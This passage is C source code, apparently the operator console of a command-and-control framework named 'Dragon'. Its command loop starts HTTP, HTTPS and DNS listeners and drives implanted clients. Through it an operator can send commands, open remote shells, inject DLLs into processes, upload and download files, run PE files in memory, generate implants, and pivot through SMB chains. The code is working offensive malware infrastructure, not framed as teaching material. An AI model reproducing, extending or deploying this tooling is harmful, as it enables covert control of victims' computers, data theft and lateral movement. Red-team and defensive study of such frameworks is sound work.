        printf("[GENERATE] Failed (exit %d)\n", status);
    }
}

/* =========================================================================
 * print_help_commands
 *
 * Prints all available commands with usage.
 * ====================================================================== */
void print_help_commands() {
    printf("Commands:\n");
    printf("  start <name> <proto> <port>           - Start listener\n");
    printf("  stop <name>                           - Stop listener\n");
    printf("  list                                  - List active listeners\n");
    printf("  listeners                             - List all active listeners\n");
    printf("  clients                               - List connected clients\n");
    printf("  send <port> <level> <id> <cmd>        - Send command\n");
    printf("  shell <port> <level> <id>             - Interactive shell\n");
    printf("  shell_dll <port> <pid> <dll> <level>  - Shell via DLL injection\n");
    printf("  stlistener <port> <level> <id> <name> <lport> <proto>  - Start client listener\n");
    printf("  stlistener <port> <level> <id> <name> smb              - Start SMB listener\n");
    printf("  stop_listener <port> <level> <id> <name>               - Stop client listener\n");
    printf("  listlisteners <port> <level> <id>     - List client listeners\n");
    printf("  listroutes <port> <level> <id>        - List client routes\n");
    printf("  uploads <port> <level> <id> <local_file_path> <remote_file_path> - Uploads file to client\n");
    printf("  downloads <port> <level> <id> <remote_file_path> <local_file_path> - Downloads file to client\n");
    printf("  execmem <port> <level> <id> <path> [args] - Exec PE in memory\n");
    printf("  generate <transport> <level> <ip> <port> <name_listener> - Build client\n");
    printf("  generate smb <level> <father_ip> <father_id> <name_listener> - Build SMB client (multi-level only)\n");
    printf("  profile_reload                        - Get current profile from %s\n", PROFILE_CONF_PATH);
    printf("  profile                               - Show current profile from memory\n");
    printf("  profile_init                          - Create default %s\n", PROFILE_CONF_PATH);
    printf("  exit                                  - Exit\n");
    printf("  help                                  - This help\n");
}

/* =========================================================================
 * main
 *
 * Entry point. Inits libsodium, loads server key, connects to MongoDB,
 * runs the operator command loop via readline.
 * ====================================================================== */
int main(int argc, char const *argv[]) {
    if (set_mongodb_connection() != EXIT_SUCCESS) {
        fprintf(stderr, "Failed to connect to MongoDB\n");
        exit(EXIT_FAILURE);
    }
    if (sodium_init() < 0) {
        fprintf(stderr, "libsodium init failed\n");
        exit(EXIT_FAILURE);
    }
    load_server_key();

    pthread_t beacon_thread;
    pthread_create(&beacon_thread, NULL, check_inactive_client, NULL);
    pthread_detach(beacon_thread);

    char *input;
    char  command[2048];
    profile_save_default(PROFILE_CONF_PATH);
    profile_reload();
    print_help_commands();

    while (1) {
        input = readline("\nDragon: ");
        if (input == NULL) { printf("\n"); break; }
        if (*input != '\0') add_history(input);

        strncpy(command, input, sizeof(command) - 1);
        command[sizeof(command)-1] = '\0';
        trim_newline(command);
        free(input);

        if (command[0] == '\0') continue;

        if (strncmp(command, "start", 5) == 0) {
            char lname[32] = {0}, proto[32] = {0};
            int  port = 0;
            int sn = sscanf(command, "start %31s %31s %d", lname, proto, &port);
            if (strcmp(proto, "smb") == 0) {
                printf("[ERROR] SMB listeners run on clients only (use stlistener)\n");
            } else if (sn == 3) {
                profile_reload();
                if (strcmp(proto, "http") == 0)
                    http_server_set_paths(g_profile.http_path_data,
                                          g_profile.http_path_hs);
                else if (strcmp(proto, "https") == 0)
                    https_server_set_paths(g_profile.http_path_data,
                                           g_profile.http_path_hs);
                else if (strcmp(proto, "dns") == 0)
                    dns_server_set_domain(g_profile.dns_domain);
                if (start_listen_on_port(lname, proto, port, &g_profile) != 0)
                    printf("Failed to start listener\n");
            } else {
                printf("Usage: start <name> <proto> <port>\n");
            }
        } else if (strncmp(command, "stop ", 5) == 0 && strncmp(command, "stop_", 5) != 0) {
            char stop_name[32];
            if (sscanf(command, "stop %31s", stop_name) == 1) {
                stop_listen_on_port(stop_name);
            } else {
                printf("Usage: stop <name>\n");
            }

        } else if (strcmp(command, "list") == 0) {
            list_listeners();

        } else if (strcmp(command, "clients") == 0) {
            list_clients();

        } else if (strncmp(command, "send", 4) == 0) {
            int  port, level;
            char target_id[ID_LEN] = {0};
            char *rest = command + 4;
            while (*rest == ' ') rest++;
            port = strtol(rest, &rest, 10);
            while (*rest == ' ') rest++;
            level = strtol(rest, &rest, 10);
            while (*rest == ' ') rest++;
            int id_len = 0;
            while (id_len < ID_LEN-1 && *rest && *rest != ' ')
                target_id[id_len++] = *rest++;
            target_id[id_len] = '\0';
            while (*rest == ' ') rest++;
            if (port && level && *rest)
                send_command_to_client(port, level, target_id, rest);
            else
                printf("Usage: send <port> <level> <id> <cmd>\n");

        } else if (strncmp(command, "shell", 5) == 0) {
            int  port, level;
            char id[ID_LEN];
            if (sscanf(command, "shell %d %d %40s",
                        &port, &level, id) == 3)
                interactive_shell(port, level, id);

        } else if (strncmp(command, "shell_dll", 9) == 0) {
            int  port, pid, level;
            char dll_path[256];
            if (sscanf(command, "shell_dll %d %d %255s %d",
                        &port, &pid, dll_path, &level) == 4)
                send_dll_to_client(port, pid, dll_path, level);

        } else if (strncmp(command, "stlistener", 10) == 0) {
            int  port, level, listener_port = 0;
            char transport_type[16] = {0};
            char name[32] = {0};
            char id[ID_LEN] = {0};
            int n = sscanf(command,
                        "stlistener %d %d %40s %31s %d %15s",
                        &port, &level, id, name,
                        &listener_port, transport_type);
            if (n == 6) {
                send_start_listener_to_client(port, level, id, listener_port, transport_type, name);
            } else if (n == 4 && strcmp(name, "smb") != 0) {
                /* check if 5th token is "smb" */
                char maybe_proto[16] = {0};
                if (sscanf(command, "stlistener %*d %*d %*s %*s %15s", maybe_proto) == 1
                    && strcmp(maybe_proto, "smb") == 0) {
                    send_start_listener_to_client(port, level, id, 445, "smb", name);
                } else {
                    printf("Usage: stlistener <port> <level> <id> <name> <lport> <proto>\n");
                    printf("       stlistener <port> <level> <id> <name> smb\n");
                }
            } else {
                printf("Usage: stlistener <port> <level> <id> <name> <lport> <proto>\n");
                printf("       stlistener <port> <level> <id> <name> smb\n");
            }

        } else if (strncmp(command, "stop_listener", 13) == 0) {
            int  port, level;
            char id[ID_LEN] = {0};
            char name[32] = {0};
            if (sscanf(command, "stop_listener %d %d %40s %31s",
                        &port, &level, id, name) == 4) {
                send_stop_listener_to_client(port, level, id, name);
            } else {
                printf("Usage: stop_listener <port> <level> <id> <name>\n");
            }

        } else if (strncmp(command, "listlisteners", 13) == 0) {
            char client_id[ID_LEN];
            int  level, port;
            if (sscanf(command, "listlisteners %d %d %40s",
                        &port, &level, client_id) == 3)
                send_req_listeners(port, level, client_id);
            else
                printf("Usage: listlisteners <port> <level> <id>\n");

        } else if (strncmp(command, "listroutes", 10) == 0) {
            char client_id[ID_LEN];
            int  level, port;
            if (sscanf(command, "listroutes %d %d %40s",
                        &port, &level, client_id) == 3)
                send_req_routes(port, level, client_id);
            else
                printf("Usage: listroutes <port> <level> <id>\n");

            } else if (strncmp(command, "uploads", 7) == 0) {
                int  port = 0, level = 0;
                char id[ID_LEN] = {0};
                char lpath[512] = {0};
                char rpath[512] = {0};

                char *rest = command + 7;
                while (*rest == ' ') rest++;
                port = (int)strtol(rest, &rest, 10);
                while (*rest == ' ') rest++;
                level = (int)strtol(rest, &rest, 10);
                while (*rest == ' ') rest++;

                int i = 0;
                while (*rest && *rest != ' ' && i < ID_LEN - 1)
                    id[i++] = *rest++;
                id[i] = '\0';
                while (*rest == ' ') rest++;

                int li = 0;
                if (*rest == '\'') {
                    rest++;
                    while (*rest && *rest != '\'' && li < 511) lpath[li++] = *rest++;
                    if (*rest == '\'') rest++;
                } else {
                    while (*rest && *rest != ' ' && li < 511) lpath[li++] = *rest++;
                }
                lpath[li] = '\0';
                while (*rest == ' ') rest++;

                int ri = 0;
                if (*rest == '\'') {
                    rest++;
                    while (*rest && *rest != '\'' && ri < 511) rpath[ri++] = *rest++;
                    if (*rest == '\'') rest++;
                } else {
                    while (*rest && *rest != ' ' && ri < 511) rpath[ri++] = *rest++;
                }
                rpath[ri] = '\0';

                if (port && level && id[0] && lpath[0] && rpath[0])
                    send_file_to_client(port, level, id, lpath, rpath);
                else
                    printf("Usage: uploads <port> <level> <id> <local_path> <remote_path>\n");
        } else if (strncmp(command, "downloads", 9) == 0) {
            int  port = 0, level = 0;
            char id[ID_LEN] = {0};
            char rpath[512] = {0};
            char lpath[512] = {0};

            char *rest = command + 9;
            while (*rest == ' ') rest++;
            port = (int)strtol(rest, &rest, 10);
            while (*rest == ' ') rest++;
            level = (int)strtol(rest, &rest, 10);
            while (*rest == ' ') rest++;

            int i = 0;
            while (*rest && *rest != ' ' && i < ID_LEN - 1)
                id[i++] = *rest++;
            id[i] = '\0';
            while (*rest == ' ') rest++;

            int ri = 0;
            if (*rest == '\'') {
                rest++;
                while (*rest && *rest != '\'' && ri < 511) rpath[ri++] = *rest++;
                if (*rest == '\'') rest++;
            } else {
                while (*rest && *rest != ' ' && ri < 511) rpath[ri++] = *rest++;
            }
            rpath[ri] = '\0';
            while (*rest == ' ') rest++;

            int li = 0;
            if (*rest == '\'') {
                rest++;
                while (*rest && *rest != '\'' && li < 511) lpath[li++] = *rest++;
                if (*rest == '\'') rest++;
            } else {
                while (*rest && *rest != ' ' && li < 511) lpath[li++] = *rest++;
            }
            lpath[li] = '\0';

            if (port && level && id[0] && rpath[0] && lpath[0])
                send_file_download_request(port, level, id, rpath, lpath);
            else
                printf("Usage: downloads <port> <level> <id> <remote_path> <local_path>\n");
        } else if (strncmp(command, "execmem", 7) == 0) {
            int  port = 0, level = 0;
            char id[ID_LEN] = {0};
            char lpath[512] = {0};
    
            char *rest = command + 7;
            while (*rest == ' ') rest++;
            port = (int)strtol(rest, &rest, 10);
            while (*rest == ' ') rest++;
            level = (int)strtol(rest, &rest, 10);
            while (*rest == ' ') rest++;
    
            int i = 0;
            while (*rest && *rest != ' ' && i < ID_LEN - 1)
                id[i++] = *rest++;
            id[i] = '\0';
            while (*rest == ' ') rest++;
    
            int li = 0;
            if (*rest == '\'') {
                rest++;
                while (*rest && *rest != '\'' && li < 511) lpath[li++] = *rest++;
                if (*rest == '\'') rest++;
            } else {
                while (*rest && *rest != ' ' && li < 511) lpath[li++] = *rest++;
            }
            lpath[li] = '\0';
            while (*rest == ' ') rest++;
    
            if (port && level && id[0] && lpath[0])
                send_exec_memory(port, level, id, lpath, *rest ? rest : NULL);
            else
                printf("Usage: execmem <port> <level> <id> <local_path> [args]\n");
        } else if (strncmp(command, "generate", 8) == 0) {
            char transport[16] = {0};
            char ip[256] = {0};
            char father_id[ID_LEN] = {0};
            int level = 0, port = 0;

            char listener_name[32] = {0};
            int n = sscanf(command, "generate %15s %d %255s %d %40s %31s",
                           transport, &level, ip, &port, father_id, listener_name);
            int is_smb = (strcmp(transport, "smb") == 0);

            if (is_smb && level <= 1) {
                printf("[ERROR] SMB is multi-level only (level >= 2)\n");
                printf("Usage: generate smb <level> <father_ip> <father_id>\n");

            } else if (is_smb && n < 3) {
                printf("Usage: generate smb <level> <father_ip> <father_id>\n");

            } else if (is_smb) {
                /* "generate smb 2 10.0.0.5 father_abc"
                 *  sscanf matched 4+ tokens: ip is correct,
                 *  but &port ate father_id — re-parse the 4th token */
                char re_fid[ID_LEN] = {0};
                sscanf(command, "generate %*s %*d %*s %40s %31s", re_fid, listener_name);
                strncpy(father_id, re_fid, sizeof(father_id) - 1);
                port = 445;

                if (!father_id[0]) {
                    printf("Usage: generate smb <level> <father_ip> <father_id> <listener_name>\n");
                } else {
                    profile_reload();
                    malleable_profile_t prof = g_profile;
                    int found_father = 0;
                    pthread_mutex_lock(&clients_collection_mutex);
                    for (int i = 0; i < MAX_CLIENTS; i++) {
                        if (clients[i] && clients[i]->id &&
                            strcmp(clients[i]->id, father_id) == 0) {
                            RemoteListener *rl = clients[i]->remote_listeners;
                            while (rl) {
                                if (strcmp(rl->name, listener_name) == 0) {
                                    prof = rl->profile;
                                    printf("[GENERATE] using listener profile \"%s\" from %s\n",
                                           listener_name, father_id);
                                    found_father = 1;
                                    break;
                                }
                                rl = rl->next;
                            }
                            if (!found_father && clients[i]->profile_received) {
                                prof = clients[i]->profile;
                                printf("[WARN] no listener \"%s\" for %s, fallback to 0x50 profile\n",
                                       listener_name, father_id);
                                found_father = 1;
                            }
                            break;
                        }
                    }
                    pthread_mutex_unlock(&clients_collection_mutex);
                    if (!found_father)
                        printf("[WARN] father %s not found, using current profile\n",
                               father_id);

                    if (strcmp(transport, "dns") == 0 &&
                        (prof.dns_domain[0] == '\0' ||
                         strcmp(prof.dns_domain, "c2.example.com") == 0))
                        printf("[WARN] DNS domain not set in %s\n", PROFILE_CONF_PATH);

                    profile_dump(&prof);
                    generate_client(transport, level, "0.0.0.0", 0, ip, port, listener_name, &prof);
                }

            } else if (n < 4) {
                printf("Usage:\n");
                printf("  generate <transport> <level> <ip> <port> <listener_name>\n");
                printf("  generate <transport> <level> <father_ip> <father_port> <father_id> <listener_name>\n");
                printf("  generate smb <level> <father_ip> <father_id> <listener_name>\n");
                printf("Examples:\n");
                printf("  generate https 1 192.168.1.100 8080\n");
                printf("  generate https 2 192.168.1.50 4447 father_id\n");
                printf("  generate smb 2 192.168.1.50 father_id\n");
                printf("\nProfile loaded from %s (edit before generate)\n", PROFILE_CONF_PATH);

            } else {
                profile_reload();
                malleable_profile_t prof = g_profile;

                if (level == 1) {
                    ListeningSocket *found = NULL;
                    pthread_mutex_lock(&list_mutex);
                    ListeningSocket *ls = head_listeners;
                    while (ls) {
                        if (strcmp(ls->name, listener_name) == 0 && ls->active) {
                            found = ls;
                            break;
                        }
                        ls = ls->next;
                    }
                    pthread_mutex_unlock(&list_mutex);
                    if (found) {
                        prof = found->profile;
                        printf("[GENERATE] using profile from listener \"%s\"\n", listener_name);
                    } else
                        printf("[WARN] no active listener \"%s\", using current profile\n",
                               listener_name);
                } else {
                    if (father_id[0]) {
                        int found_father = 0;
                        pthread_mutex_lock(&clients_collection_mutex);
                        for (int i = 0; i < MAX_CLIENTS; i++) {
                            if (clients[i] && clients[i]->id &&
                                strcmp(clients[i]->id, father_id) == 0) {
                                RemoteListener *rl = clients[i]->remote_listeners;
                                while (rl) {
                                    if (strcmp(rl->name, listener_name) == 0) {
                                        prof = rl->profile;
                                        printf("[GENERATE] using listener profile \"%s\" from %s\n",
                                               listener_name, father_id);
                                        found_father = 1;
                                        break;
                                    }
                                    rl = rl->next;
                                }
                                if (!found_father && clients[i]->profile_received) {
                                    prof = clients[i]->profile;
                                    printf("[WARN] no listener \"%s\" for %s, fallback to 0x50 profile\n",
                                           listener_name, father_id);
                                    found_father = 1;
                                }
                                break;
                            }
                        }
                        pthread_mutex_unlock(&clients_collection_mutex);
                        if (!found_father)
                            printf("[WARN] father %s not found, using current profile\n",
                                   father_id);
                    } else
                        printf("[WARN] no father_id given for L%d, using current profile\n",
                               level);
                }

                if (strcmp(transport, "dns") == 0 &&
                    (prof.dns_domain[0] == '\0' ||
                     strcmp(prof.dns_domain, "c2.example.com") == 0))
                    printf("[WARN] DNS domain not set in %s\n", PROFILE_CONF_PATH);

                profile_dump(&prof);

                if (level == 1)
                    generate_client(transport, level, ip, port, "0.0.0.0", 0, listener_name, &prof);
                else
                    generate_client(transport, level, "0.0.0.0", 0, ip, port, listener_name, &prof);
            }
        } else if (strcmp(command, "profile_init") == 0) {
            profile_save_default(PROFILE_CONF_PATH);

        } else if (strcmp(command, "profile_reload") == 0) {
            profile_reload();
            if (g_profile_loaded)
                profile_dump(&g_profile);

        } else if (strcmp(command, "profile") == 0) {
            if (g_profile_loaded)
                profile_dump(&g_profile);
            else
                printf("[PROFILE] not loaded. Run 'profile init' to create it.\n");
        } else if (strcmp(command, "listeners") == 0) {
                registry_list_all();
        }else if (strncmp(command, "exit", 4) == 0) {
            pthread_mutex_lock(&list_mutex);
            while (head_listeners) {
                ListeningSocket *ls = head_listeners;
                head_listeners = ls->next;
                ls->active = 0;
                if (ls->trans && ls->trans->close_listener)
                    ls->trans->close_listener(ls->handle);
                free(ls);
            }
            pthread_mutex_unlock(&list_mutex);
            printf("Exiting...\n");
            break;

        } else if (strcmp(command, "help") == 0) {
            print_help_commands();

        } else {
            printf("Unknown command\n");
        }
    }

    destroy_db_connection();
    return 0;
}